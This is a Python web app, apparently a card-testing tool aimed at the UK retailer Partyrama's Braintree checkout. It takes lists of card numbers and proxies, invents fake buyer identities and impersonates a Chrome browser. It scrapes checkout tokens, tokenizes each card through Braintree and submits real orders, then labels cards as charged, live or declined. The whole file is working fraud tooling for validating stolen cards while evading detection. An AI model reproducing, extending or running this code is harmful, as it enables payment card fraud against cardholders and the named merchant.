# app.py
from __future__ import annotations

import asyncio
import base64
import json
import random
import re
import uuid
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
import requests
import urllib3
from curl_cffi import requests as cffi
from faker import Faker

urllib3.disable_warnings()

app = FastAPI(title="Ollie Partyrama Braintree Checker")

HOST = "https://www.partyrama.co.uk"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
BT_VERSION = "2018-05-10"
BT_MERCHANT = "h9rc962wyvrr97jn"
BT_GRAPHQL = "https://payments.braintree-api.com/graphql"
BT_3DS_BASE = f"https://api.braintreegateway.com/merchants/{BT_MERCHANT}/client_api/v1/payment_methods"
PRODUCT_URL = HOST + "/?add-to-cart=1389245"
CHECKOUT_URL = HOST + "/checkout/"
AJAX_TOKEN_URL = HOST + "/?wc-ajax=wc_braintree_frontend_request&path=/wc-braintree/v1/client-token/create"
PROXY_CHECK_URL = "https://api.ipify.org?format=json"

fake = Faker("en_GB")
Faker.seed()

TOKENIZE_QUERY = (
    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
    "  tokenizeCreditCard(input: $input) {"
    "    token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear"
    "      binData { prepaid healthcare debit durbinRegulated commercial payroll"
    "        issuingBank countryOfIssuance productId business consumer purchase corporate }"
    "    }"
    "  }"
    "}"
)

def gen_identity():
    first = fake.first_name()
    last = fake.last_name()
    postcode = fake.postcode()
    phone = "+44" + str(random.randint(7000000000, 7999999999))
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 99999)}@yopmail.com"
    return {
        "first_name": first, "last_name": last, "company": "Partyrama Customer",
        "country": "GB", "address_1": fake.street_address(), "address_2": "",
        "city": "London", "state": "Greater London",
        "postcode": postcode, "phone": phone, "email": email,
    }

class ProxyPool:
    def __init__(self, proxies):
        self.proxies = [p.strip() for p in proxies if p.strip()]
        self.i = 0

    def next_dict(self):
        if not self.proxies: return None
        p = self.proxies[self.i % len(self.proxies)]
        self.i += 1
        if "://" in p: return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            h, po, u, pw = parts
            fmt = f"http://{u}:{pw}@{h}:{po}"
            return {"http": fmt, "https": fmt}
        return {"http": f"http://{p}", "https": f"http://{p}"}

def verify_proxy(p):
    formatted = {"http": p, "https": p} if "://" in p else {"http": f"http://{p}", "https": f"http://{p}"}
    try:
        r = requests.get(PROXY_CHECK_URL, proxies=formatted, timeout=6, verify=False)
        return r.status_code == 200 and bool(r.json().get("ip"))
    except Exception:
        return False

def check_and_clean_proxies(raw_proxies, threads=20):
    alive = []
    if not raw_proxies:
        return alive
    
    def _check(p):
        p = p.strip()
        if not p: return None
        if verify_proxy(p):
            return p
        return None

    with ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
        futures = [ex.submit(_check, p) for p in raw_proxies]
        for f in as_completed(futures):
            res = f.result()
            if res:
                alive.append(res)
    return alive

def extract_fingerprint(html):
    match = re.search(r'id=["\']braintree_cc_config_data["\'][^>]+value=["\'](.*?)["\'](?:\s+|>)', html, re.DOTALL)
    if match:
        try:
            raw_json = match.group(1).replace("&quot;", '"')
            cfg = json.loads(raw_json)
            fp = cfg.get("androidPay", {}).get("googleAuthorizationFingerprint")
            if fp: return fp
        except Exception: pass
    match_js = re.search(r'var\s+wc_braintree_client_token\s*=\s*\[\s*["\']([^"\']+)["\']\s*\]', html)
    if match_js:
        try:
            b64_token = match_js.group(1) + "=" * (-len(match_js.group(1)) % 4)
            token_data = json.loads(base64.b64decode(b64_token).decode("utf-8", errors="ignore"))
            fp = token_data.get("authorizationFingerprint")
            if fp: return fp
        except Exception: pass
    return None

def extract_cart_key(html):
    m = re.search(r'name=["\']cart\[([a-f0-9]{20,})\]\[qty\]', html)
    if m: return m.group(1)
    m = re.search(r'data-cart_item_key=["\']([a-f0-9]{20,})["\']', html)
    return m.group(1) if m else "partyrama_cart_item"

def extract_shipping(html):
    m = re.search(r'name=["\']shipping_method\[0\]["\'][^>]*?\bvalue=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else "flat_rate:1"

def extract_checkout_nonce(html):
    for p in (
        r'(?:name|id)=["\']woocommerce-process-checkout-nonce["\'][^>]*?\bvalue=["\']([^"\']+)["\']',
        r'\bvalue=["\']([^"\']+)["\'][^>]*?\b(?:name|id)=["\']woocommerce-process-checkout-nonce["\']',
    ):
        m = re.search(p, html, re.I)
        if m: return m.group(1)
    return "dummy_nonce_fix"

def extract_config_json(html):
    import html as htmllib
    m = re.search(r'name=["\']braintree_cc_config_data["\'][^>]*?\bvalue=["\']([^"\']*)["\']', html, re.I)
    if m:
        v = htmllib.unescape(m.group(1))
        if v and len(v) > 50: return v
    return None

def extract_total(html):
    m = re.search(r'class=["\'][^"\']*order-total[^"\']*["\'][^>]*>(.*?)</tr>', html, re.S | re.I)
    if m:
        m2 = re.search(r'[£$€]\s*([\d.,]+)', m.group(1))
        if m2: return m2.group(1).replace(",", "")
    return "4.35"

def extract_reason(msgs):
    if isinstance(msgs, str):
        clean = re.sub(r"<[^>]+>", " ", msgs)
        clean = re.sub(r"\s+", " ", clean).strip()
        if len(clean) > 80: clean = clean[:77] + "..."
        return clean
    return "No reason provided"

def classify(reason, wc_result):
    if wc_result == "success": return "CHARGED"
    if not reason: return "DECLINED"
    m = reason.lower()
    if any(k in m for k in ("avs", "address verification", "address does not match")): return "AVS"
    if any(k in m for k in ("insufficient", "cvv", "cvc", "security code")): return "LIVE"
    return "DECLINED"

def run_single_card(card_line, pool):
    parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", card_line) if p.strip()]
    if len(parts) < 4: return {"card": card_line, "status": "INVALID", "reason": "Invalid Format"}
    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    yy = yy if len(yy) == 4 else "20" + yy[-2:]
    masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"

    ident = gen_identity()
    session_id = str(uuid.uuid4())
    sess = cffi.Session(impersonate="chrome124", timeout=30)
    sess.trust_env = False

    try:
        prox = pool.next_dict()
        sess.get(HOST + "/", proxies=prox, timeout=15)
        sess.get(PRODUCT_URL, proxies=prox, timeout=15)
        co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
        html = co.text

        fingerprint = extract_fingerprint(html)
        if not fingerprint:
            ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
            if ajax_resp.status_code == 200:
                fingerprint = ajax_resp.json().get("authorizationFingerprint")

        if not fingerprint:
            return {"card": masked, "status": "DEAD", "reason": "No fingerprint found"}

        cart_key = extract_cart_key(html)
        shipping = extract_shipping(html)
        wc_nonce = extract_checkout_nonce(html)
        config_data = extract_config_json(html)
        total = extract_total(html)

        tp = {
            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
            "query": TOKENIZE_QUERY,
            "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
            "authorization": "Bearer " + fingerprint,
            "braintree-version": BT_VERSION,
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "user-agent": UA,
        }, timeout=15, verify=False)
        
        bj = bt.json()
        nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
        if not nonce_token:
            err = bj.get("errors") or "no token"
            return {"card": masked, "status": "DECLINED", "reason": extract_reason(str(err))}

        wc_body = {
            "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
            "billing_country": ident["country"], "billing_address_1": ident["address_1"],
            "billing_city": ident["city"], "billing_state": ident["state"],
            "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
            "billing_email": ident["email"], "shipping_method[0]": shipping,
            "payment_method": "braintree_cc", "braintree_cc_nonce_key": nonce_token,
            "braintree_cc_config_data": config_data or "", "terms": "on",
            "woocommerce-process-checkout-nonce": wc_nonce,
        }

        rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
        jj = rr.json()
        wc_result = str(jj.get("result", "")).lower()
        if wc_result == "success":
            return {"card": masked, "status": "CHARGED", "reason": "Order Successful"}
        
        reason = extract_reason(jj.get("messages") or "")
        status = classify(reason, wc_result)
        return {"card": masked, "status": status, "reason": reason}
    except Exception as e:
        return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ollie Partyrama Braintree Checker v5.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-6">
    <main class="max-w-4xl mx-auto space-y-6">
        <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
            <div>
                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Braintree Checker</h1>
                <p class="text-xs text-slate-400 font-mono">Braintree Custom Integration + Proxy Auto-Prune & Threads</p>
            </div>
        </div>

        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
            <form method="POST" action="/check" id="checkerForm" class="space-y-4">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-xs font-medium text-slate-400 mb-1">Proxy Threads</label>
                        <input id="proxyThreads" name="proxy_threads" type="number" value="20" min="1" max="100" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
                    </div>
                    <div>
                        <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
                        <input id="cardThreads" name="card_threads" type="number" value="5" min="1" max="20" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
                    </div>
                </div>

                <div class="space-y-2">
                    <label class="block text-xs font-medium text-slate-400">Proxy List (host:port:user:pass o http://...)</label>
                    <textarea id="proxyInput" name="proxies" rows="3" placeholder="http://user:pass@host:port"
                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
                </div>

                <div class="space-y-2">
                    <label class="block text-xs font-medium text-slate-400">Cards List (CC|MM|YY|CVV)</label>
                    <textarea id="cardInput" name="cards" rows="4" placeholder="548809...|04|27|913" required
                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
                </div>

                <button type="submit" id="checkButton"
                    class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
                    Simulan ang Pagsusuri ng mga Kard
                </button>
            </form>
        </div>
    </main>
</body>
</html>"""

@app.post("/check", response_class=HTMLResponse)
async def check_cards(
    request: Request, 
    cards: str = Form(...), 
    proxies: str = Form(""),
    proxy_threads: int = Form(20),
    card_threads: int = Form(5)
):
    card_list = [line.strip() for line in cards.splitlines() if line.strip()]
    raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]

    # Auto-prune dead proxies bago isalang ang mga card
    alive_proxies = check_and_clean_proxies(raw_proxies, threads=proxy_threads)
    pool = ProxyPool(alive_proxies)

    proxy_stats = {
        "total": len(raw_proxies),
        "alive": len(alive_proxies),
        "dead": len(raw_proxies) - len(alive_proxies)
    }

    results = []
    with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
        futures = [ex.submit(run_single_card, card, pool) for card in card_list]
        for f in as_completed(futures):
            results.append(f.result())

    # HTML rendering na may modernong disenyo para sa mga resulta at detalye ng card
    results_html = ""
    for r in results:
        badge_color = "bg-rose-500 text-white"
        if r['status'] == 'CHARGED': badge_color = "bg-emerald-500 text-black"
        elif r['status'] == 'AVS': badge_color = "bg-teal-500 text-black"
        elif r['status'] == 'LIVE': badge_color = "bg-amber-500 text-black"
        elif r['status'] == '3DS': badge_color = "bg-purple-500 text-white"

        results_html += f"""
        <div class="bg-slate-950 border border-slate-800 p-3 rounded-lg flex items-center justify-between font-mono text-xs">
            <div>
                <span class="px-2 py-1 rounded font-bold {badge_color}">{r['status']}</span>
                <span class="text-sky-400 ml-2">{r['card']}</span>
            </div>
            <span class="text-slate-400">{r['reason']}</span>
        </div>"""

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Resulta - Partyrama Braintree Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-6">
    <main class="max-w-4xl mx-auto space-y-6">
        <div class="flex items-center justify-between border-b border-slate-800 pb-4">
            <h1 class="text-2xl font-bold text-emerald-400">Resulta ng Pagsusuri</h1>
            <a href="/" class="bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-lg font-semibold transition">Bumalik</a>
        </div>

        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
            <div class="text-xs text-slate-400 font-mono">
                Proxy Report: Total: {proxy_stats['total']} | <span class="text-emerald-400">Live: {proxy_stats['alive']}</span> | <span class="text-rose-400">Dead: {proxy_stats['dead']}</span>
            </div>
            <div class="space-y-2 max-h-[500px] overflow-y-auto">
                {results_html if results_html else '<p class="text-slate-500 text-xs">Walang nakitang resulta.</p>'}
            </div>
        </div>
    </main>
</body>
</html>"""
